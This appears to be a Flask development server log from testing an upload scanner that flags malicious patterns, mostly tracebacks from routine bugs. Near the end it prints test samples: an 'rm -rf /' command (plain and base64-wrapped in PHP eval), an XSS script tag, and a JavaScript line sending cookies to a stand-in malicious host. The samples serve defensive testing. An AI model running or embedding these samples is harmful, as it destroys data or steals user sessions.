2025-02-22 18:33:10,475 - 127.0.0.1 - - [22/Feb/2025 18:33:10] "GET / HTTP/1.1" 200 -
2025-02-22 18:33:26,158 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 169, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/new_test/new_test/HELLO.txt'
2025-02-22 18:33:26,159 - 127.0.0.1 - - [22/Feb/2025 18:33:26] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 18:33:28,442 - 127.0.0.1 - - [22/Feb/2025 18:33:28] "GET / HTTP/1.1" 200 -
2025-02-22 18:46:29,318 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:46:29,318 - [33mPress CTRL+C to quit[0m
2025-02-22 18:46:32,774 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 18:46:32,777 - 127.0.0.1 - - [22/Feb/2025 18:46:32] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:46:33,654 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 18:46:33,655 - 127.0.0.1 - - [22/Feb/2025 18:46:33] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:47:16,038 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:47:16,038 - [33mPress CTRL+C to quit[0m
2025-02-22 18:47:19,388 - 127.0.0.1 - - [22/Feb/2025 18:47:19] "GET / HTTP/1.1" 200 -
2025-02-22 18:47:25,650 - 127.0.0.1 - - [22/Feb/2025 18:47:25] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:47:25,652 - 127.0.0.1 - - [22/Feb/2025 18:47:25] "GET / HTTP/1.1" 200 -
2025-02-22 18:47:37,708 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 18:47:37,709 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 18:47:37,709 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 18:47:37,709 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 18:47:37,710 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 18:47:37,710 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 18:47:37,711 - 127.0.0.1 - - [22/Feb/2025 18:47:37] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:47:37,716 - 127.0.0.1 - - [22/Feb/2025 18:47:37] "GET / HTTP/1.1" 200 -
2025-02-22 18:47:49,564 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-22 18:47:49,582 - Malicious pattern detected in uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 18:47:49,582 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-22 18:47:49,594 - 127.0.0.1 - - [22/Feb/2025 18:47:49] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:47:49,596 - 127.0.0.1 - - [22/Feb/2025 18:47:49] "GET / HTTP/1.1" 200 -
2025-02-22 18:51:14,414 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:51:14,415 - [33mPress CTRL+C to quit[0m
2025-02-22 18:51:18,698 - 127.0.0.1 - - [22/Feb/2025 18:51:18] "GET / HTTP/1.1" 200 -
2025-02-22 18:51:25,635 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 119, in upload_file
    filename = secure_filename(file.filename)
NameError: name 'secure_filename' is not defined
2025-02-22 18:51:25,636 - 127.0.0.1 - - [22/Feb/2025 18:51:25] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 18:51:33,302 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 119, in upload_file
    filename = secure_filename(file.filename)
NameError: name 'secure_filename' is not defined
2025-02-22 18:51:33,303 - 127.0.0.1 - - [22/Feb/2025 18:51:33] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 18:52:11,683 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 883, in full_dispatch_request
    return self.finalize_request(rv)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 902, in finalize_request
    response = self.make_response(rv)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1174, in make_response
    raise TypeError(
TypeError: The view function for 'upload_file' did not return a valid response. The function either returned None or ended without a return statement.
2025-02-22 18:52:11,684 - 127.0.0.1 - - [22/Feb/2025 18:52:11] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 18:52:24,859 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:52:24,859 - [33mPress CTRL+C to quit[0m
2025-02-22 18:52:27,356 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 18:52:27,358 - 127.0.0.1 - - [22/Feb/2025 18:52:27] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:52:28,829 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 18:52:28,829 - 127.0.0.1 - - [22/Feb/2025 18:52:28] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:52:29,009 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 18:52:29,010 - 127.0.0.1 - - [22/Feb/2025 18:52:29] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 18:52:34,871 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:52:34,872 - [33mPress CTRL+C to quit[0m
2025-02-22 18:52:36,983 - 127.0.0.1 - - [22/Feb/2025 18:52:36] "GET / HTTP/1.1" 200 -
2025-02-22 18:52:42,539 - 127.0.0.1 - - [22/Feb/2025 18:52:42] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:52:42,542 - 127.0.0.1 - - [22/Feb/2025 18:52:42] "GET / HTTP/1.1" 200 -
2025-02-22 18:52:55,888 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-22 18:52:55,908 - Malicious pattern detected in uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 18:52:55,908 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-22 18:52:55,920 - 127.0.0.1 - - [22/Feb/2025 18:52:55] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 18:52:55,925 - 127.0.0.1 - - [22/Feb/2025 18:52:55] "GET / HTTP/1.1" 200 -
2025-02-22 18:53:38,888 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 18:53:38,888 - [33mPress CTRL+C to quit[0m
2025-02-22 18:53:42,012 - 127.0.0.1 - - [22/Feb/2025 18:53:42] "GET / HTTP/1.1" 200 -
2025-02-22 18:53:46,106 - 127.0.0.1 - - [22/Feb/2025 18:53:46] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 18:53:46,108 - 127.0.0.1 - - [22/Feb/2025 18:53:46] "GET / HTTP/1.1" 200 -
2025-02-22 19:04:36,185 - Malicious pattern detected in uploads/test_doc_hidden.docx
2025-02-22 19:04:36,185 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 19:04:36,197 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-22 19:04:36,197 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 19:04:36,205 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:04:36,205 - [33mPress CTRL+C to quit[0m
2025-02-22 19:04:39,149 - 127.0.0.1 - - [22/Feb/2025 19:04:39] "GET / HTTP/1.1" 200 -
2025-02-22 19:04:45,533 - Malicious pattern detected in uploads/test_doc_hidden.docx
2025-02-22 19:04:45,534 - 127.0.0.1 - - [22/Feb/2025 19:04:45] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:04:45,538 - 127.0.0.1 - - [22/Feb/2025 19:04:45] "GET / HTTP/1.1" 200 -
2025-02-22 19:05:00,307 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-22 19:05:00,324 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-22 19:05:00,330 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-22 19:05:00,336 - 127.0.0.1 - - [22/Feb/2025 19:05:00] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 19:05:00,339 - 127.0.0.1 - - [22/Feb/2025 19:05:00] "GET / HTTP/1.1" 200 -
2025-02-22 19:06:06,298 - Malicious pattern detected in uploads/app.py
2025-02-22 19:06:06,299 - 127.0.0.1 - - [22/Feb/2025 19:06:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:06:06,302 - 127.0.0.1 - - [22/Feb/2025 19:06:06] "GET / HTTP/1.1" 200 -
2025-02-22 19:06:20,549 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 19:06:20,550 - 127.0.0.1 - - [22/Feb/2025 19:06:20] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 19:06:20,554 - 127.0.0.1 - - [22/Feb/2025 19:06:20] "GET / HTTP/1.1" 200 -
2025-02-22 19:07:33,944 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:07:33,944 - [33mPress CTRL+C to quit[0m
2025-02-22 19:07:37,753 - 127.0.0.1 - - [22/Feb/2025 19:07:37] "GET / HTTP/1.1" 200 -
2025-02-22 19:07:45,217 - 127.0.0.1 - - [22/Feb/2025 19:07:45] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:07:45,220 - 127.0.0.1 - - [22/Feb/2025 19:07:45] "GET / HTTP/1.1" 200 -
2025-02-22 19:08:29,821 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:08:29,821 - [33mPress CTRL+C to quit[0m
2025-02-22 19:08:41,434 - 127.0.0.1 - - [22/Feb/2025 19:08:41] "GET / HTTP/1.1" 200 -
2025-02-22 19:08:45,817 - 127.0.0.1 - - [22/Feb/2025 19:08:45] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:08:45,820 - 127.0.0.1 - - [22/Feb/2025 19:08:45] "GET / HTTP/1.1" 200 -
2025-02-22 19:08:56,335 - Malicious pattern detected in uploads/new_test/new_test/test_hidden_xml.xml
2025-02-22 19:08:56,350 - Malicious pattern detected in uploads/new_test/new_test/test_doc_hidden.docx
2025-02-22 19:08:56,361 - Malicious pattern detected in uploads/new_test/new_test/test_sql_injection.txt
2025-02-22 19:08:56,372 - 127.0.0.1 - - [22/Feb/2025 19:08:56] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 19:08:56,374 - 127.0.0.1 - - [22/Feb/2025 19:08:56] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:16,514 - Extracted content from uploads/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:10:16,521 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:10:16,525 - Extracted content from uploads/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:10:16,526 - Extracted content from uploads/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:10:16,526 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:10:16,526 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:10:16,531 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:10:16,535 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:10:16,535 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:10:16,537 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:10:16,537 - [33mPress CTRL+C to quit[0m
2025-02-22 19:10:23,849 - 127.0.0.1 - - [22/Feb/2025 19:10:23] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:24,774 - 127.0.0.1 - - [22/Feb/2025 19:10:24] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:29,473 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:10:29,480 - 127.0.0.1 - - [22/Feb/2025 19:10:29] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:10:29,482 - 127.0.0.1 - - [22/Feb/2025 19:10:29] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:32,679 - 127.0.0.1 - - [22/Feb/2025 19:10:32] "[32mGET /delete/21 HTTP/1.1[0m" 302 -
2025-02-22 19:10:32,683 - 127.0.0.1 - - [22/Feb/2025 19:10:32] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:33,730 - 127.0.0.1 - - [22/Feb/2025 19:10:33] "[32mGET /delete/20 HTTP/1.1[0m" 302 -
2025-02-22 19:10:33,734 - 127.0.0.1 - - [22/Feb/2025 19:10:33] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:35,260 - 127.0.0.1 - - [22/Feb/2025 19:10:35] "[32mGET /delete/19 HTTP/1.1[0m" 302 -
2025-02-22 19:10:35,265 - 127.0.0.1 - - [22/Feb/2025 19:10:35] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:36,791 - 127.0.0.1 - - [22/Feb/2025 19:10:36] "[32mGET /delete/1 HTTP/1.1[0m" 302 -
2025-02-22 19:10:36,795 - 127.0.0.1 - - [22/Feb/2025 19:10:36] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:38,330 - 127.0.0.1 - - [22/Feb/2025 19:10:38] "[32mGET /delete/2 HTTP/1.1[0m" 302 -
2025-02-22 19:10:38,334 - 127.0.0.1 - - [22/Feb/2025 19:10:38] "GET / HTTP/1.1" 200 -
